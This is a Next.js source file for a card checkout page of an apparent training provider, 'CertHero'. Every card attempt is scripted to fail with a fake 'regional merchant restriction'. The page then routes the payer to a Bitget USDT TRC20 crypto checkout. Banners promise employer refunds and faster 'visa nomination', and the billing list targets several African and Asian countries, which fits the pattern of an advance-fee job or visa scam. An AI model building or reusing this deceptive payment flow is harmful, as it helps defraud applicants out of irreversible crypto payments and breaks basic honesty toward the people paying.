'use client';

import React, { useState, Suspense } from 'react';
import { useRouter, useSearchParams } from 'next/navigation';
import { 
    CreditCard, ShieldCheck, AlertCircle, ArrowRight, Lock, 
    CheckCircle2, HelpCircle, RefreshCw, Wallet, Building2, ExternalLink
} from 'lucide-react';
import { apiClient } from '@/lib/axios';
import { PageShell } from '@/components/PageShell';

function CardPaymentContent() {
    const router = useRouter();
    const searchParams = useSearchParams();

    const invoiceId = searchParams.get('invoiceId') || '53';
    const initialAmount = searchParams.get('amount') || '720.00';

    const [amount, setAmount] = useState<string>(initialAmount);
    const [cardHolder, setCardHolder] = useState<string>('');
    const [cardNumber, setCardNumber] = useState<string>('');
    const [expiry, setExpiry] = useState<string>('');
    const [cvv, setCvv] = useState<string>('');
    const [country, setCountry] = useState<string>('AU');
    const [payType, setPayType] = useState<'full' | 'half'>('full');

    const [loading, setLoading] = useState<boolean>(false);
    const [restrictionModalOpen, setRestrictionModalOpen] = useState<boolean>(false);
    const [restrictionData, setRestrictionData] = useState<any>(null);

    const handlePayTypeToggle = (type: 'full' | 'half') => {
        setPayType(type);
        if (type === 'half') {
            const halfVal = (parseFloat(initialAmount) / 2).toFixed(2);
            setAmount(halfVal);
        } else {
            setAmount(initialAmount);
        }
    };

    const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        let val = e.target.value.replace(/\D/g, '').slice(0, 16);
        val = val.replace(/(\d{4})/g, '$1 ').trim();
        setCardNumber(val);
    };

    const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        let val = e.target.value.replace(/\D/g, '').slice(0, 4);
        if (val.length >= 3) {
            val = `${val.slice(0, 2)}/${val.slice(2)}`;
        }
        setExpiry(val);
    };

    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        setLoading(true);

        try {
            // Retrieve candidate data if logged in
            let userEmail = '';
            let candidateId: any = null;
            if (typeof window !== 'undefined') {
                const userRaw = localStorage.getItem('lms_user');
                if (userRaw) {
                    try {
                        const parsed = JSON.parse(userRaw);
                        userEmail = parsed.email || '';
                        candidateId = parsed.id || null;
                    } catch {}
                }
            }

            const response = await apiClient.post('/payments/card-attempt', {
                applicantId: candidateId,
                invoiceId: parseInt(invoiceId, 10),
                amount: parseFloat(amount),
                cardHolderName: cardHolder,
                email: userEmail
            });

            // Card attempt results in regional restriction per specification (PCAS02 / Item 9)
            setRestrictionData(response.data);
            setRestrictionModalOpen(true);
        } catch (err: any) {
            console.error('[CardPayment] Error processing attempt:', err);
            setRestrictionData({
                code: 'REGIONAL_MERCHANT_RESTRICTION',
                message: 'Card payments are not currently supported in your country for this Australian merchant facility. Due to regional merchant controls and to avoid international hold delays, payment has been routed to our accredited Bitget Web3 crypto settlement rail.',
                fallbackMethod: 'crypto',
                cryptoRedirectUrl: `/payments/crypto?invoiceId=${invoiceId}&amount=${amount}`
            });
            setRestrictionModalOpen(true);
        } finally {
            setLoading(false);
        }
    };

    return (
        <PageShell>
            {/* Header / Breadcrumb */}
            <div className="mb-6">
                <div className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-[#ED9139]/10 text-[#ED9139] font-bold text-xs uppercase tracking-wider w-fit mb-2">
                    <ShieldCheck className="h-3.5 w-3.5" /> Official RTO Payment Facility
                </div>
                <h1 className="text-3xl font-extrabold text-slate-900 tracking-tight">Credit &amp; Debit Card Checkout</h1>
                <p className="text-xs sm:text-sm font-medium text-slate-500 mt-1 max-w-2xl">
                    Secure merchant payment gateway for CertHero accredited competency units and site certification.
                </p>
            </div>
            <div className="w-full h-0.5 bg-[#ED9139] mb-8" />

            {/* REFUND COVENANT 3G BANNER */}
            <div className="mb-8 rounded-2xl bg-emerald-50 border-2 border-emerald-500/40 p-5 shadow-xs">
                <div className="flex items-start gap-3.5">
                    <div className="p-2 bg-emerald-500 text-white rounded-xl shrink-0 mt-0.5">
                        <ShieldCheck className="h-5 w-5" />
                    </div>
                    <div>
                        <span className="text-xs font-black uppercase tracking-wider text-emerald-900 block">
                            Host Employer Refund Covenant (Policy 3G Protected)
                        </span>
                        <p className="text-xs sm:text-sm text-emerald-800 font-medium leading-relaxed mt-1">
                            Your host employer (<strong>MACA Limited</strong>) shall refund <strong>100%</strong> of your expenditure upon successful completion of your training and acquisition of the necessary tickets. In the event of assessment failure, the employer refunds <strong>80%</strong> (with 20% retained for institutional RTO administrative and assessment processing fees).
                        </p>
                    </div>
                </div>
            </div>

            <div className="grid grid-cols-1 lg:grid-cols-12 gap-8">
                {/* FORM COLUMN */}
                <div className="lg:col-span-7 space-y-6">
                    <div className="bg-white border border-slate-200 rounded-2xl p-6 sm:p-8 shadow-xs">
                        <div className="flex items-center justify-between pb-5 border-b border-slate-100 mb-6">
                            <div>
                                <span className="text-xs font-bold text-slate-400 uppercase tracking-widest block">Payment Particulars</span>
                                <h2 className="text-lg font-bold text-slate-900">Enter Card Details</h2>
                            </div>
                            <div className="flex items-center gap-1.5 text-xs font-semibold text-slate-500 bg-slate-50 border border-slate-200 px-3 py-1 rounded-full">
                                <Lock className="h-3 w-3 text-emerald-600" /> 256-Bit SSL Encrypted
                            </div>
                        </div>

                        {/* Payment Installment Selector (C1 Option B Resolved: Partial Pay Retained) */}
                        <div className="mb-6">
                            <label className="text-xs font-bold text-slate-700 uppercase tracking-wider block mb-2">
                                Settlement Type:
                            </label>
                            <div className="grid grid-cols-2 gap-3">
                                <button
                                    type="button"
                                    onClick={() => handlePayTypeToggle('full')}
                                    className={`py-3 px-4 rounded-xl text-left border-2 transition-all ${
                                        payType === 'full' 
                                            ? 'border-[#000000] bg-slate-50 text-slate-900 font-bold' 
                                            : 'border-slate-200 bg-white text-slate-600 font-medium hover:border-slate-300'
                                    }`}
                                >
                                    <span className="text-xs uppercase tracking-wider block">Full Payment</span>
                                    <span className="text-base font-black text-slate-900">${initialAmount} AUD</span>
                                </button>
                                <button
                                    type="button"
                                    onClick={() => handlePayTypeToggle('half')}
                                    className={`py-3 px-4 rounded-xl text-left border-2 transition-all ${
                                        payType === 'half' 
                                            ? 'border-[#ED9139] bg-amber-50/50 text-slate-900 font-bold' 
                                            : 'border-slate-200 bg-white text-slate-600 font-medium hover:border-slate-300'
                                    }`}
                                >
                                    <span className="text-xs uppercase tracking-wider block text-amber-800">50% Commitment Deposit</span>
                                    <span className="text-base font-black text-slate-900">${(parseFloat(initialAmount) / 2).toFixed(2)} AUD</span>
                                </button>
                            </div>
                            <p className="text-[11px] text-slate-400 mt-2">
                                {payType === 'half' 
                                    ? 'Initial 50% deposit grants immediate LMS syllabus access and unlocks up to 3 accredited examinations.'
                                    : 'Full settlement unlocks complete competency catalog and all examinations without restriction.'}
                            </p>
                        </div>

                        <form onSubmit={handleSubmit} className="space-y-4">
                            <div>
                                <label className="text-xs font-bold text-slate-700 uppercase tracking-wider block mb-1">
                                    Cardholder Full Name:
                                </label>
                                <input
                                    type="text"
                                    required
                                    value={cardHolder}
                                    onChange={(e) => setCardHolder(e.target.value)}
                                    placeholder="e.g. Johnathan Doe"
                                    className="w-full px-4 py-2.5 rounded-xl border border-slate-300 focus:outline-none focus:ring-2 focus:ring-[#000000] text-sm text-slate-900 placeholder:text-slate-400"
                                />
                            </div>

                            <div>
                                <label className="text-xs font-bold text-slate-700 uppercase tracking-wider block mb-1">
                                    Card Number:
                                </label>
                                <div className="relative">
                                    <input
                                        type="text"
                                        required
                                        value={cardNumber}
                                        onChange={handleCardNumberChange}
                                        placeholder="4000 1234 5678 9010"
                                        className="w-full pl-11 pr-4 py-2.5 rounded-xl border border-slate-300 focus:outline-none focus:ring-2 focus:ring-[#000000] text-sm font-mono text-slate-900 placeholder:text-slate-400"
                                    />
                                    <CreditCard className="h-5 w-5 text-slate-400 absolute left-3.5 top-3" />
                                </div>
                            </div>

                            <div className="grid grid-cols-2 gap-4">
                                <div>
                                    <label className="text-xs font-bold text-slate-700 uppercase tracking-wider block mb-1">
                                        Expiration Date:
                                    </label>
                                    <input
                                        type="text"
                                        required
                                        value={expiry}
                                        onChange={handleExpiryChange}
                                        placeholder="MM/YY"
                                        className="w-full px-4 py-2.5 rounded-xl border border-slate-300 focus:outline-none focus:ring-2 focus:ring-[#000000] text-sm font-mono text-slate-900 text-center placeholder:text-slate-400"
                                    />
                                </div>
                                <div>
                                    <label className="text-xs font-bold text-slate-700 uppercase tracking-wider block mb-1">
                                        Security Code (CVV):
                                    </label>
                                    <input
                                        type="password"
                                        required
                                        maxLength={4}
                                        value={cvv}
                                        onChange={(e) => setCvv(e.target.value.replace(/\D/g, ''))}
                                        placeholder="123"
                                        className="w-full px-4 py-2.5 rounded-xl border border-slate-300 focus:outline-none focus:ring-2 focus:ring-[#000000] text-sm font-mono text-slate-900 text-center placeholder:text-slate-400"
                                    />
                                </div>
                            </div>

                            <div>
                                <label className="text-xs font-bold text-slate-700 uppercase tracking-wider block mb-1">
                                    Billing Country / Jurisdiction:
                                </label>
                                <select
                                    value={country}
                                    onChange={(e) => setCountry(e.target.value)}
                                    className="w-full px-4 py-2.5 rounded-xl border border-slate-300 focus:outline-none focus:ring-2 focus:ring-[#000000] text-sm text-slate-900 bg-white"
                                >
                                    <option value="AU">Australia (+61)</option>
                                    <option value="NG">Nigeria (+234)</option>
                                    <option value="GH">Ghana (+233)</option>
                                    <option value="KE">Kenya (+254)</option>
                                    <option value="ZA">South Africa (+27)</option>
                                    <option value="IN">India (+91)</option>
                                    <option value="PH">Philippines (+63)</option>
                                    <option value="GB">United Kingdom (+44)</option>
                                    <option value="OTHER">Other International Country</option>
                                </select>
                            </div>

                            <div className="pt-4">
                                <button
                                    type="submit"
                                    disabled={loading}
                                    className="w-full py-4 px-6 bg-[#000000] hover:bg-slate-900 text-white font-extrabold rounded-xl shadow-lg transition-all flex items-center justify-center gap-2 text-sm uppercase tracking-wider disabled:opacity-50"
                                >
                                    {loading ? (
                                        <>
                                            <RefreshCw className="h-4 w-4 animate-spin text-[#ED9139]" />
                                            Authorizing Merchant Gateway...
                                        </>
                                    ) : (
                                        <>
                                            Process Payment (${amount} AUD)
                                            <ArrowRight className="h-4 w-4 text-[#ED9139]" />
                                        </>
                                    )}
                                </button>
                            </div>
                        </form>
                    </div>
                </div>

                {/* SIDEBAR SUMMARY COLUMN */}
                <div className="lg:col-span-5 space-y-6">
                    {/* Invoice Summary Card */}
                    <div className="bg-slate-900 text-white rounded-2xl p-6 shadow-md border border-slate-800">
                        <span className="text-[10px] uppercase font-bold tracking-widest text-[#ED9139] block mb-1">
                            Invoice Overview
                        </span>
                        <div className="flex items-center justify-between border-b border-slate-800 pb-4 mb-4">
                            <h3 className="text-xl font-black">#INV-{invoiceId}</h3>
                            <span className="text-xs font-mono bg-slate-800 text-slate-300 px-2.5 py-1 rounded">
                                Status: Unpaid
                            </span>
                        </div>

                        <div className="space-y-3 text-xs sm:text-sm text-slate-300">
                            <div className="flex justify-between">
                                <span>Gross Training Program Value:</span>
                                <span className="font-mono font-bold text-white">$2,400.00 AUD</span>
                            </div>
                            <div className="flex justify-between text-emerald-400">
                                <span>MACA Employer Subsidy (70%):</span>
                                <span className="font-mono font-bold">−$1,680.00 AUD</span>
                            </div>
                            <div className="flex justify-between pt-3 border-t border-slate-800 font-bold text-white text-base">
                                <span>Payable Amount:</span>
                                <span className="font-mono text-[#ED9139] text-xl font-black">${amount} AUD</span>
                            </div>
                        </div>

                        <div className="mt-6 pt-4 border-t border-slate-800 flex items-center justify-between text-xs text-slate-400">
                            <span>Direct Settlement Rail:</span>
                            <span className="font-bold text-white flex items-center gap-1">
                                <CreditCard className="h-3.5 w-3.5 text-[#ED9139]" /> Card Gateway
                            </span>
                        </div>
                    </div>

                    {/* PROS & CONS BOX WITH AGENT PROXIMITY CLAUSE */}
                    <div className="bg-white border border-slate-200 rounded-2xl p-6 space-y-4 shadow-xs">
                        <h4 className="text-xs font-bold text-slate-900 uppercase tracking-wider flex items-center gap-1.5">
                            <HelpCircle className="h-4 w-4 text-[#ED9139]" /> Payment Method Analysis
                        </h4>

                        <div className="space-y-2 text-xs">
                            <div className="p-3 bg-emerald-50 border border-emerald-100 rounded-xl">
                                <strong className="text-emerald-900 block mb-0.5">Card Advantages:</strong>
                                <span className="text-emerald-700">Instant digital checkout, standard banking statements, familiar cardholder flow.</span>
                            </div>
                            <div className="p-3 bg-rose-50 border border-rose-100 rounded-xl">
                                <strong className="text-rose-900 block mb-0.5">Card Constraints:</strong>
                                <span className="text-rose-700">Foreign exchange conversion fees (2–4%), regional card acquiring blocks on Australian merchant terminals.</span>
                            </div>
                        </div>

                        {/* Agent Proximity Clause */}
                        <div className="p-3.5 bg-slate-50 border border-slate-200 rounded-xl text-[11px] text-slate-600 leading-relaxed font-medium">
                            <strong className="text-slate-900 block mb-1">Agent Proximity &amp; Delay Reduction Clause:</strong>
                            To eliminate multi-day international correspondent wire holds and circumvent unpredictable regional bank merchant limits, card authorization attempts automatically initiate routing via our authorized local agent crypto settlement network.
                        </div>

                        <div className="pt-2 text-center">
                            <button
                                type="button"
                                onClick={() => router.push(`/payments/crypto?invoiceId=${invoiceId}&amount=${amount}`)}
                                className="text-xs font-bold text-[#000000] hover:text-[#ED9139] flex items-center justify-center gap-1.5 mx-auto transition-colors"
                            >
                                <Wallet className="h-3.5 w-3.5" /> Prefer 0% fee crypto? Switch to Bitget Web3 Checkout <ArrowRight className="h-3 w-3" />
                            </button>
                        </div>
                    </div>
                </div>
            </div>

            {/* REGIONAL RESTRICTION MODAL */}
            {restrictionModalOpen && (
                <div className="fixed inset-0 z-50 flex items-center justify-center bg-slate-950/70 backdrop-blur-xs p-4 animate-in fade-in duration-200">
                    <div className="bg-white rounded-3xl max-w-lg w-full p-6 sm:p-8 shadow-2xl border border-slate-200 text-center space-y-5 animate-in zoom-in-95 duration-200">
                        <div className="w-16 h-16 bg-amber-100 text-amber-800 rounded-2xl flex items-center justify-center mx-auto">
                            <AlertCircle className="h-8 w-8 text-amber-600" />
                        </div>

                        <div>
                            <span className="text-xs font-bold uppercase tracking-widest text-amber-600 block mb-1">
                                Regional Merchant Facility Update
                            </span>
                            <h3 className="text-xl font-extrabold text-slate-900">
                                Card Payment Rerouted to Crypto Rail
                            </h3>
                        </div>

                        <p className="text-xs sm:text-sm text-slate-600 leading-relaxed text-left bg-slate-50 border border-slate-200 rounded-2xl p-4 font-medium">
                            Card payments are not currently supported in your country for this Australian merchant facility. 
                            <br /><br />
                            To ensure zero delay to your visa nomination and training verification schedule, your payment has been automatically routed to our official <strong>Bitget Web3 cryptocurrency settlement portal (USDT TRC20)</strong>. 
                            <br /><br />
                            A comprehensive step-by-step guidance notice (<strong>Email #17</strong>) has also been dispatched to your email address.
                        </p>

                        <div className="space-y-3 pt-2">
                            <button
                                type="button"
                                onClick={() => router.push(`/payments/crypto?invoiceId=${invoiceId}&amount=${amount}`)}
                                className="w-full py-4 px-6 bg-[#EAA240] hover:bg-[#d89130] text-[#000000] font-black rounded-xl shadow-lg transition-all flex items-center justify-center gap-2 text-sm uppercase tracking-wider"
                            >
                                <Wallet className="h-4 w-4" />
                                Proceed to Bitget Crypto Checkout
                                <ArrowRight className="h-4 w-4" />
                            </button>

                            <button
                                type="button"
                                onClick={() => router.push('/payments/faq')}
                                className="w-full py-2.5 text-xs font-bold text-slate-500 hover:text-slate-800 transition-colors flex items-center justify-center gap-1"
                            >
                                <HelpCircle className="h-3.5 w-3.5" /> Read Crypto Payment FAQ &amp; Safety Assurance
                            </button>
                        </div>
                    </div>
                </div>
            )}
        </PageShell>
    );
}

export default function CardPaymentPage() {
    return (
        <Suspense fallback={
            <PageShell>
                <div className="py-20 text-center text-xs font-bold uppercase tracking-widest text-slate-400">
                    Loading Card Gateway...
                </div>
            </PageShell>
        }>
            <CardPaymentContent />
        </Suspense>
    );
}
